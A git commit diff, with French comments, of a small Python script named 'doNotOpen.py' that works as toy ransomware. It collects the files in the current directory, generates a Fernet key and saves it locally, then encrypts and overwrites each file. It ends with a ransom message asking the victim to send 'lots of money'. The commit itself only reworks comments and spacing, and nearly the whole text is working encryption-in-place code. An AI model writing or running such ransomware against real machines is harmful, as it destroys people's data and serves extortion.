70e08abd78de2ffa7f399de65cb5897e64b5cfbc
Amine1102 <74661844+Amine1102@users.noreply.github.com>
2022-06-15 12:13:43 +0200

    Update doNotOpen.py
    Quelques commentaires

--- doNotOpen.py
+++ doNotOpen.py
@@ -1,8 +1,9 @@
 import os
 from cryptography.fernet import Fernet
 
-# Rechercher les fichiers a crypter
 
+
+# Rechercher les fichiers a crypter
 fichiers = []
 
 for file in os.listdir():
@@ -23,13 +24,15 @@ with open("theKey.key","wb") as theKey:   #Crée un fichier et save la clef deda
 
 
 
-for file in fichiers:             #Pour chaque fichier de la liste
-	with open(file,"rb") as theFile:   #rb = read
-		data = theFile.read()   # Save le contenu du fichier dans "data"
-	data_encrypted = Fernet(key).encrypt(data)  #Permet de crypter data avec la clé
-	with open(file,"wb") as theFile:		# wb = write
+for file in fichiers:             
+	with open(file,"rb") as theFile:   		#rb : read
+		data = theFile.read()   		# Save le contenu du fichier dans "data"
+	data_encrypted = Fernet(key).encrypt(data)  	#Permet de crypter data avec la clé
+	with open(file,"wb") as theFile:		#wb : write
 		theFile.write(data_encrypted) 
 	# la derniere ligne remplace le contenue du fichier  par data_encrypted
 
+	
+	
 print("Tous vos fichiers ont été crypté, merci de m'envoyer beaucoup d'argent")
 print("Verifiez avec un 'cat nomfichier' :)")
